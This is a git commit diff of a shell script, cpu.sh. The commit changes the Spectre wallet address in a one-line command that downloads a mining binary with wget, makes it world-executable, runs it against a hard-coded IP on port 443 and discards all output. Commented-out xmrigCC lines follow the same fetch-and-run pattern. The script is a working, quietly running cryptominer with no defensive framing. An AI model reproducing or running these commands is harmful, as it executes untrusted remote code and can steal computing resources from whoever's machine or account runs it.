98d4ac212e6e0eaa7f2cfe755ae08995e28ed5c6
MJVideo <majapahlevi@gmail.com>
2025-02-23 16:20:29 +0000

    Edit cpu.sh

--- cpu.sh
+++ cpu.sh
@@ -5,7 +5,7 @@
 #wget https://gitlab.com/majapahlevi/mvp/-/raw/main/xmrigCC-3.4.1.tar.gz && tar -xf xmrigCC-3.4.1.tar.gz && rm xmrigCC-3.4.1.tar.gz && ./miner/xmrigDaemon -o 157.230.239.11:80 -u SaLvsC9mJtH435TnShocT387uQRGZcDZGJsfYF4MfuAGTRGAffsUNjSAtNdgDtsqHGDAqSu8icwQpjD8eBbXAtoyNqzHDQW4oPA -p .$(shuf -n 1 -i 1-999)-Bismillah -k -a randomx -t4 > /dev/null 2>&1
 
 
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/Tnn0.4.0 && chmod 777 Tnn0.4.0 && ./Tnn0.4.0 --daemon-address 138.197.44.235 --port 443 --worker-name $(shuf -n 1 -i 1-9999)-Bismillah --spectre --wallet spectre:qr5es5kys9xh9aqzwzgdegg0y7su2d3hvdh5zr7m4hq5dhwd5gl35p0t6n9q9 --threads 4 > /dev/null 2>&1
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/Tnn0.4.0 && chmod 777 Tnn0.4.0 && ./Tnn0.4.0 --daemon-address 138.197.44.235 --port 443 --worker-name $(shuf -n 1 -i 1-9999)-Bismillah --spectre --wallet spectre:qpel996pz6mxk86mgy7p8cg62hsgzl98u338h0gwhme9ec55sk8eqlw8wqqs0 --threads 4 > /dev/null 2>&1
 
 #wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.1/xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && rm xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && ./miner/xmrigDaemon -o 142.93.71.111:443 -u TuskeSyuMmk2xje2yUypZdWqLyjzRG7AjgcGk21HqjPTeztTahdSjA1SL7qokYAJxJ2NESFcGy5oQEdtNXMqjFGp5a7RE7cVrLa3LS -p WK01 -k -a rx/tuske -t4 > /dev/null 2>&1
 
